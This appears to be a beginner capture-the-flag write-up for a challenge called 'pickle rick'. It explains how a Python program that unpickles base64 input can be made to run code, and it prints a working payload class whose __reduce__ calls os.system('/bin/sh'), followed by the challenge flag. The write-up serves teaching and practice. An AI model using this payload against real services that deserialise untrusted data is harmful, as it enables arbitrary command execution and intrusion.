# Writeup for `pickle rick`

| author | category | value |
|--------|----------|-------|
|  poi   |   misc   |  100  |

I've turned myself into a pickle, Morty!!

| cost |                content                 |
|------|----------------------------------------|
|  10  | Rick is pretty based, based64 even...? |

## Solution

<details>
<summary>Click here to reveal the solution!</summary>

## The Big Idea

The challenge involves exploiting a Python program that uses `pickle` to deserialise data from a base64-encoded string. The goal is to craft a payload that, when deserialised by the program, executes arbitrary code, leading to a privilege escalation or arbitrary command execution.

The solution involves creating a malicious class with a specially crafted `__reduce__` method, which is called during deserialisation by `pickle`. By returning a tuple containing a function and its arguments, we can instruct `pickle` to execute arbitrary code when deserialising the object.

```python
import pickle
import base64

class MaliciousClass:
    def __reduce__(self):
        import os
        return (os.system, ('/bin/sh',))

malicious_instance = MaliciousClass()

pickled_malicious_instance = pickle.dumps(malicious_instance)

encoded_payload = base64.b64encode(pickled_malicious_instance).decode('utf-8')
print(encoded_payload)
```
We then copy the encoded payload into the program, which it then unpickles and executes, granting us a shell. From here we can `cat recipe` and find the flag.

### Flag(s)

- `BEGINNER{turn3d_my53lf_1nt0_4_p1ckl3}`

</details>
